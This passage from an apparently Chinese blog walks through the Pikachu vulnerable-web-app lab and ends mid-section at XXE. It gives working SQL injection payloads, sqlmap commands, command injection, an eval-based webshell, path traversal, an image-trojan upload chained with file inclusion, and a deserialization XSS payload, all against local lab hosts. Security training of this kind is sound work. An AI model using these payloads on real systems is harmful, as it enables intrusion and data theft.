title=\"Pikachu关卡\"></a>Pikachu关卡</h3><h4 id=\"数字型注入-post\"><a href=\"#数字型注入-post\" class=\"headerlink\" title=\"数字型注入(post)\"></a>数字型注入(post)</h4><ul>\n<li><p>表单内容在前端进行了限制, 但是很容易解除, 比如可以抓包然后进行修改, 下图将原本提交的<code>1</code>修改为<code>1 or 1=1</code><br><img src=\"https://i0.imgs.ovh/2024/02/04/btJxp.png\"></p>\n</li>\n<li><p>提交后, 可以看到所有的用户都被查询成功<br><img src=\"https://i0.imgs.ovh/2024/02/04/btziT.png\"></p>\n</li>\n</ul>\n<h4 id=\"字符型注入-get\"><a href=\"#字符型注入-get\" class=\"headerlink\" title=\"字符型注入(get)\"></a>字符型注入(get)</h4><ul>\n<li><p>构造闭合即可, 先对站点进行测试, 可先传入一些特殊字符比- 如<code>&#39;</code>, <code>&quot;</code>, <code>%</code>等, 下面是输入单引号<code>&#39;</code>的结果,<br><img src=\"https://i0.imgs.ovh/2024/02/04/btjkl.png\"></p>\n</li>\n<li><p>测试发现其后端对查询语句的处理是用单引号<code>&#39;</code>进行包裹的,因此可以用单引号构造闭合, 例如, 输入<code>&#39; or 1=1;#</code>, 同样可以搜索到所有用户,  其中, <code>#</code>对将后面的内容注释掉防止报错</p>\n</li>\n</ul>\n<h4 id=\"搜索型注入\"><a href=\"#搜索型注入\" class=\"headerlink\" title=\"搜索型注入\"></a>搜索型注入</h4><ul>\n<li><p>测试发现可以用<code>%&#39;</code>构造闭合, 且输入<code>#%&#39; or 1=1 order by 3;#</code>显示正常,, 但是输入<code>#%&#39; or 1=1 order by 4;#</code>显示异常, 说明总共有三列</p>\n</li>\n<li><p>输入<code>#%&#39; and id=1 union select user(),database(),version();#</code>获取到一些数据库信息</p>\n<p><img src=\"https://i0.imgs.ovh/2024/02/05/bJMIW.png\"></p>\n</li>\n</ul>\n<h4 id=\"xx型注入\"><a href=\"#xx型注入\" class=\"headerlink\" title=\"xx型注入\"></a>xx型注入</h4><ul>\n<li><p>输入<code>&#39;</code>:<br><img src=\"https://i0.imgs.ovh/2024/02/05/bJsI5.png\"></p>\n</li>\n<li><p>通过报错信息的提示可以推断, 应按照<code>(&#39;xx&#39;)</code>构造闭合<br><img src=\"https://i0.imgs.ovh/2024/02/05/bJwye.png\"></p>\n</li>\n</ul>\n<h4 id=\"“insert-update”注入\"><a href=\"#“insert-update”注入\" class=\"headerlink\" title=\"“insert&#x2F;update”注入\"></a>“insert&#x2F;update”注入</h4><ul>\n<li><p>*<em>insert</em></p>\n<ul>\n<li><p>正常没有回显, 但是可以通过报错获取信息</p>\n</li>\n<li><p>payload:<code>xxx&#39; or updatexml(1,concat(0x7e,user()),0) or &#39;</code>获取到user信息:<br><img src=\"https://i0.imgs.ovh/2024/02/05/biomv.png\"></p>\n</li>\n</ul>\n</li>\n<li><p><strong>update</strong></p>\n<ul>\n<li>payload和insert相同</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"“delete注入”\"><a href=\"#“delete注入”\" class=\"headerlink\" title=\"“delete注入”\"></a>“delete注入”</h4><ul>\n<li><p>分析: 根据抓包得到的信息可以发现, 执行删除操作时会向服务器发送一个get请求, 请求中含有要删除内容的数字id,推测在后端有语句<code>delete from xxx where id=78</code><br><img src=\"https://i0.imgs.ovh/2024/02/06/b8o6o.png\"></p>\n</li>\n<li><p>因此可以在此次插入sql语句<code>or updatexml(1,concat(0x7e,xxx),0) </code>制造报错, 从而获取信息<br><img src=\"https://i0.imgs.ovh/2024/02/06/b8u95.png\"><br><img src=\"https://i0.imgs.ovh/2024/02/06/b8OMs.png\"></p>\n</li>\n</ul>\n<h4 id=\"“http-header”注入\"><a href=\"#“http-header”注入\" class=\"headerlink\" title=\"“http header”注入\"></a>“http header”注入</h4><ul>\n<li><p>根据登录后的页面可以得知, 后端对请求头的数据进行了处理, 可以尝试在请求头中插入sql语句</p>\n</li>\n<li><p>将UA头修改为<code>Firefox&#39; or updatexml(1, concat(0x7e, database()) ,0) or &#39;#</code><br><img src=\"https://i0.imgs.ovh/2024/02/06/b85uu.png\"></p>\n<p>得到<br><img src=\"https://i0.imgs.ovh/2024/02/06/b8Y8l.png\"></p>\n</li>\n</ul>\n<h4 id=\"盲注-base-on-boolean\"><a href=\"#盲注-base-on-boolean\" class=\"headerlink\" title=\"盲注(base on boolean)\"></a>盲注(base on boolean)</h4><ul>\n<li>后端可能对报错进行了过滤, 导致没有回显, 但是输入<code>vince&#39; and 1=1#</code>显示<br><img src=\"https://i0.imgs.ovh/2024/02/07/bqWkO.png\"></li>\n<li>输入<code>vince&#39; and 1=2#</code><br><img src=\"https://i0.imgs.ovh/2024/02/07/bqktH.png\"></li>\n<li>根据这点不同可以获取到信息,比如payload为<code>vince&#39; and ascii(substr(database(),1,1))=112#</code>时显示第一种情况, 说明database名的第一个字符为<code>p</code>, 根据这个原理可以不断的尝试直到获取到所有信息</li>\n<li>但是手动操作非常的麻烦, 可以使用自动化工具sqlmap进行操作<br>获取当前数据库名:<code>py .\\sqlmap.py -u &quot;http://192.168.5.133:7090/vul/sqli/sqli_blind_b.php?name=1234&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --current-db</code></li>\n<li><img src=\"https://i0.imgs.ovh/2024/02/07/bq0ND.png\"></li>\n<li>获取到数据库名为<code>pikachu</code></li>\n<li>以此类推可以获取到更多信息<br><img src=\"https://i0.imgs.ovh/2024/02/07/bqhOA.png\"></li>\n</ul>\n<h4 id=\"盲注-base-on-time\"><a href=\"#盲注-base-on-time\" class=\"headerlink\" title=\"盲注(base on time)\"></a>盲注(base on time)</h4><ul>\n<li>没有回显, 甚至输入什么都一样, 无法通过前面的基于真假进行判断有无sql注入漏洞</li>\n<li>但是输入<code>vince</code>加载只花了80毫秒左右, 而输入<code>vince&#39; and sleep(5)#</code>却确实花了5秒左右<br><img src=\"https://i0.imgs.ovh/2024/02/07/bqsD5.png\"></li>\n<li>说明sleep(5)确实作为一个sql语句被执行了, 这里存在sql注入漏洞, 结合基于真假的盲注的原理, 可以构造payload:<code>vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#</code></li>\n<li>同样也是5秒后才加载完成, 说明数据库名的第一个字符为<code>p</code>, 也可以使用sqlmap进行自动化操作<br><img src=\"https://i0.imgs.ovh/2024/02/07/bqbKX.png\"></li>\n</ul>\n<h4 id=\"宽字节注入-1\"><a href=\"#宽字节注入-1\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h4><ul>\n<li>后端对输入的内容进行了转义, <code>&#39;</code>转义为<code>\\&#39;</code>使原本的payload<code>vince&#39; or 1=1 ;#</code>无法使用</li>\n<li>由于mysql使用gbk编码, 单引号转义后编码为<code>%5c%27</code>, 如果在单引号前面输入%df使其变成<code>%df%5c%27</code>前面的<code>%df%5c</code>就会被解析为一个汉字, 单引号<code>%27</code>就成功逃逸了, 实现了闭合</li>\n<li>payload修改为<code>vince%df&#39; or 1=1;#</code><br><img src=\"https://i0.imgs.ovh/2024/02/07/b9LTA.png\"></li>\n</ul>\n<h2 id=\"越权漏洞\"><a href=\"#越权漏洞\" class=\"headerlink\" title=\"越权漏洞\"></a>越权漏洞</h2><h3 id=\"概述-4\"><a href=\"#概述-4\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li><p>由于没有对用户权限进行严格的判断, 导致低权限账号可以去完成高权限账号的操作</p>\n</li>\n<li><p>属于逻辑漏洞, 是由于权限校验的逻辑不够严谨</p>\n</li>\n<li><p>水平越权</p>\n<ul>\n<li>同等权限级别间</li>\n</ul>\n</li>\n<li><p>垂直越权</p>\n<ul>\n<li>不同权限级别间</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Pikachu关卡-4\"><a href=\"#Pikachu关卡-4\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><h4 id=\"水平越权\"><a href=\"#水平越权\" class=\"headerlink\" title=\"水平越权\"></a>水平越权</h4><ul>\n<li><p>登录lucy账号, 然后点击”查看个人信息”的时候会发送一个get请求:<code>http://192.168.1.9:7071/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</code></p>\n</li>\n<li><p>服务器后台可能没有对用户权限做严格的判断, 可能导致一个用户能够查看另一个用户的信息</p>\n</li>\n<li><p>在登录lucy账号之后, 将上面get请求中的lucy改为其他用户名(比如lili), 发现可以访问<br><img src=\"https://i0.imgs.ovh/2024/02/07/b9W5u.png\"></p>\n</li>\n</ul>\n<h4 id=\"垂直越权\"><a href=\"#垂直越权\" class=\"headerlink\" title=\"垂直越权\"></a>垂直越权</h4><ul>\n<li><p>这关里pikachu是普通管理员, admin是超级管理员, 其中只有超级管理员能够执行增加用户的操作</p>\n</li>\n<li><p>先抓取超级管理员执行增加用户的数据包, 然后退出登录, 改为登录普通管理员的账号, 将获取到的数据包的请求头中的cookie替换为pikachu的cookie, 在请求体中填入增加用户的信息</p>\n<p><img src=\"https://i0.imgs.ovh/2024/02/07/b9KRI.png\"></p>\n</li>\n</ul>\n<h2 id=\"RCE-命令执行漏洞\"><a href=\"#RCE-命令执行漏洞\" class=\"headerlink\" title=\"RCE-命令执行漏洞\"></a>RCE-命令执行漏洞</h2><h3 id=\"概述-5\"><a href=\"#概述-5\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li>可以让攻击者总直接注入命令或恶意代码, 控制服务器后台</li>\n</ul>\n<h4 id=\"远程系统命令执行\"><a href=\"#远程系统命令执行\" class=\"headerlink\" title=\"远程系统命令执行\"></a>远程系统命令执行</h4><ul>\n<li><p><strong>原理</strong>: 系统上存在给用户提供特点的远程命令操作的接口(如ping), 但是没有严格的安全控制措施</p>\n</li>\n<li><p>例如: </p>\n<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #BABED8\">php</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">isset</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">_POST</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">host</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]))</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">host </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">_POST</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">host</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">res </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">shell_exec</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">ping -c 4 </span><span style=\"color: #89DDFF\">&#123;$</span><span style=\"color: #BABED8\">host</span><span style=\"color: #89DDFF\">&#125;&quot;</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #82AAFF\">echo</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">res</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">?&gt;</span></span></code></pre></div></li>\n<li><p>此时如果输入<code>127.0.0.1; ipconfig</code>就会把后面的命令也执行</p>\n</li>\n</ul>\n<h3 id=\"Pikachu关卡-5\"><a href=\"#Pikachu关卡-5\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><h4 id=\"ping-远程系统命令执行\"><a href=\"#ping-远程系统命令执行\" class=\"headerlink\" title=\"ping-远程系统命令执行\"></a>ping-远程系统命令执行</h4><ul>\n<li>可使用<code>|</code>, <code>||</code>, <code>&amp;</code>等进行拼接, 估计没做过滤处理<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20170114.png?raw=true\"></li>\n</ul>\n<h4 id=\"eval-远程代码执行\"><a href=\"#eval-远程代码执行\" class=\"headerlink\" title=\"eval-远程代码执行\"></a>eval-远程代码执行</h4><ul>\n<li><p>根据提示, 后台大概是使用了<code>eval()</code>函数</p>\n</li>\n<li><p>尝试输入<code>phpinfo();</code>, 查看是否可以执行代码<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20170509.png?raw=true\"></p>\n</li>\n<li><p>证明可以执行任意代码, 通过hackbar得知key为<code>txt</code>, 使用蚁剑尝试连接</p>\n<p><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20171007.png?raw=true\"></p>\n</li>\n<li><p>拿下webshell</p>\n</li>\n</ul>\n<h2 id=\"文件包含漏洞\"><a href=\"#文件包含漏洞\" class=\"headerlink\" title=\"文件包含漏洞\"></a>文件包含漏洞</h2><h3 id=\"概述-6\"><a href=\"#概述-6\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li><code>include()，require()，include_once()，require_once()</code>会解析执行php文件</li>\n<li>在<code>allow_url_include</code>, <code>allow_url_fopen</code>为<code>on</code>时还可以通过url地址对远程的文件进行包含, 一般会配合伪协议</li>\n</ul>\n<h3 id=\"Pikachu关卡-6\"><a href=\"#Pikachu关卡-6\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><h4 id=\"本地文件包含\"><a href=\"#本地文件包含\" class=\"headerlink\" title=\"本地文件包含\"></a>本地文件包含</h4><ul>\n<li><p>通过观察url, 有一个参数为fileX.php, X为1~5<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20172345.png?raw=true\"></p>\n</li>\n<li><p>尝试用别的文件, 比如file6.php<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20172548.png?raw=\"></p>\n</li>\n<li><p>可以看到解析了file6.php的内容, 获取了一些信息</p>\n</li>\n</ul>\n<h4 id=\"远程文件包含\"><a href=\"#远程文件包含\" class=\"headerlink\" title=\"远程文件包含\"></a>远程文件包含</h4><ul>\n<li><p>除了本地文件包含, 还可以通过http协议或php伪协议进行包含, 例如通过<code>php://filter/read</code>进行源码的获取<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20173642.png?raw=\"></p>\n</li>\n<li><p>解码后可获取源码<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20173853.png?raw=\"></p>\n</li>\n</ul>\n<h2 id=\"不安全的文件下载\"><a href=\"#不安全的文件下载\" class=\"headerlink\" title=\"不安全的文件下载\"></a>不安全的文件下载</h2><h3 id=\"概述-7\"><a href=\"#概述-7\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li>在下载功能中, 如果攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。</li>\n</ul>\n<h3 id=\"Pikachu关卡-7\"><a href=\"#Pikachu关卡-7\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><ul>\n<li><p>下载链接如下:<br><code>http://192.168.5.143:7090/vul/unsafedownload/execdownload.php?filename=kb.png</code></p>\n</li>\n<li><p>尝试将文件<code>kb.png</code>改为其它路径的文件,比如当前页面的文件<code>../down_nba.php</code>, 发现可以下载<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20174553.png?raw=\"></p>\n</li>\n<li><p>以此类推, 几乎所有文件都可以下载, 比如C盘中的系统配置文件system.ini<br><code>http://192.168.5.143:7090/vul/unsafedownload/execdownload.php?filename=../../../../../../Windows/system.ini</code></p>\n</li>\n</ul>\n<h2 id=\"文件上传漏洞\"><a href=\"#文件上传漏洞\" class=\"headerlink\" title=\"文件上传漏洞\"></a>文件上传漏洞</h2><h3 id=\"概述-8\"><a href=\"#概述-8\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li><a href=\"https://myprefer.github.io/post/WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\">通用漏洞-文件上传| Myprefer’s Blog</a></li>\n</ul>\n<h3 id=\"Pikachu关卡-8\"><a href=\"#Pikachu关卡-8\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><h4 id=\"客户端check\"><a href=\"#客户端check\" class=\"headerlink\" title=\"客户端check\"></a>客户端check</h4><ul>\n<li>只在客户端检查, 修改js或抓包改包即可绕过<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20175850.png?raw=\"></li>\n</ul>\n<h4 id=\"服务端check\"><a href=\"#服务端check\" class=\"headerlink\" title=\"服务端check\"></a>服务端check</h4><ul>\n<li>抓包, 将其中的文件类型改为image&#x2F;jpeg即可</li>\n</ul>\n<h4 id=\"getimagesize\"><a href=\"#getimagesize\" class=\"headerlink\" title=\"getimagesize()\"></a>getimagesize()</h4><ul>\n<li><p>getimagesize()函数会获取图片信息, 需要伪造图片马才能绕过</p>\n</li>\n<li><p>用命令<code>copy tmp.png/b+eval.php 1.jpg</code>生成图片马</p>\n<p><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20180938.png?raw=\"></p>\n</li>\n<li><p>可以看到一句话木马拼接到了jpg文件中</p>\n</li>\n<li><p>上传后, 由于木马文件为jpg后缀, 无法直接执行, 但可以结合文件包含漏洞使用:<br><code>http://192.168.1.5/pikachu/vul/fileinclude/fi_local.phpfilename=file:///C:\\phpstudy_pro\\WWW\\pikachu\\vul\\unsafeupload\\uploads\\1.jpg</code></p>\n</li>\n</ul>\n<h2 id=\"目录遍历\"><a href=\"#目录遍历\" class=\"headerlink\" title=\"目录遍历\"></a>目录遍历</h2><h3 id=\"概述-9\"><a href=\"#概述-9\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li><p>在 Web 功能设计中，很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活， 当用户发起一个前端的请求时，便会将请求的这个文件的值（比如文件名称）传递到后台，后台再执行其对应的文件</p>\n</li>\n<li><p>在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过<code>../</code>这样的手段让后台打开或者执行一些其他的文件，从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞</p>\n</li>\n</ul>\n<h3 id=\"Pikachu关卡-9\"><a href=\"#Pikachu关卡-9\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><ul>\n<li><strong>title</strong>参数可通过<code>../</code>进入任意目录, 造成信息泄露, 比如读取system.ini文件信息<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20182400.png?raw=\"></li>\n</ul>\n<h2 id=\"敏感信息泄露\"><a href=\"#敏感信息泄露\" class=\"headerlink\" title=\"敏感信息泄露\"></a>敏感信息泄露</h2><h3 id=\"概述-10\"><a href=\"#概述-10\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到<ul>\n<li>通过访问url下的目录，可以直接列出目录下的<strong>文件列表</strong></li>\n<li><strong>报错信息</strong>里面包含操作系统、中间件、开发语言的版本或其他信息;</li>\n<li><strong>前端源码</strong>里面包含了敏感信息</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Pikachu关卡-10\"><a href=\"#Pikachu关卡-10\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><ul>\n<li>前端代码中泄露了敏感信息<br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20182757.png?raw=\"></li>\n</ul>\n<h2 id=\"PHP反序列化\"><a href=\"#PHP反序列化\" class=\"headerlink\" title=\"PHP反序列化\"></a>PHP反序列化</h2><h3 id=\"概述-11\"><a href=\"#概述-11\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li><a href=\"https://myprefer.github.io/post/WEB%E6%94%BB%E9%98%B2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\">WEB攻防-反序列化 | Myprefer’s Blog</a></li>\n</ul>\n<h3 id=\"Pikachu关卡-11\"><a href=\"#Pikachu关卡-11\" class=\"headerlink\" title=\"Pikachu关卡\"></a>Pikachu关卡</h3><ul>\n<li><p>此漏洞利用需要代码审计,  漏洞代码:</p>\n<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #C792EA\">class</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">S</span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #C792EA\">var</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">test </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">pikachu</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #C792EA\">function</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">__construct</span><span style=\"color: #89DDFF\">()&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #82AAFF\">echo</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$this-&gt;</span><span style=\"color: #BABED8\">test</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">html</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&#39;&#39;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">isset</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">_POST</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">o</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">s </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">_POST</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">o</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #89DDFF\">(!@$</span><span style=\"color: #BABED8\">unser </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">unserialize</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">s</span><span style=\"color: #89DDFF\">))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">html</span><span style=\"color: #89DDFF\">.=&quot;</span><span style=\"color: #C3E88D\">&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;</span><span style=\"color: #89DDFF; font-style: italic\">else</span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">html</span><span style=\"color: #89DDFF\">.=&quot;</span><span style=\"color: #C3E88D\">&lt;p&gt;</span><span style=\"color: #89DDFF\">&#123;$</span><span style=\"color: #BABED8\">unser</span><span style=\"color: #89DDFF\">-&gt;</span><span style=\"color: #BABED8\">test</span><span style=\"color: #89DDFF\">&#125;</span><span style=\"color: #C3E88D\">&lt;/p&gt;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span></code></pre></div></li>\n<li><p>据此生成payload的代码</p>\n<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #BABED8\">php</span></span>\n<span class=\"line\"><span style=\"color: #C792EA\">class</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">S</span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #C792EA\">var</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">test </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">123333</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">a </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">new</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">S</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">echo</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">serialize</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">a</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">?&gt;</span></span></code></pre></div><p><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20184225.png?raw=\"></p>\n</li>\n<li><p>发现可以用来构造xss, 比如<code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:25:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;&#125;</code><br><img src=\"https://github.com/Myprefer/ImageHost/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-21%20184518.png?raw=\"></p>\n</li>\n</ul>\n<h2 id=\"XXE-xml外部实体注入漏洞\"><a href=\"#XXE-xml外部实体注入漏洞\" class=\"headerlink\" title=\"XXE-xml外部实体注入漏洞\"></a>XXE-xml外部实体注入漏洞</h2><h3 id=\"概述-12\"><a href=\"#概述-12\" class=\"headerlink\" title=\"概述\"></a>概述</h3><ul>\n<li>XXE：XML External Entity attack（XML外部实体攻击）。其实XXE就是攻击者自定义了XML文件进行了执行</li>\n</ul>\n<h4 id=\"XML-DTD\"><a href=\"#XML-DTD\" class=\"headerlink\" title=\"XML&amp;DTD\"></a>XML&amp;DTD</h4><ul>\n<li>XML(Extensible Markup Language)，全称为可扩展标记语言，是一种传输的数据格式</li>\n<li>DTD(Document Type 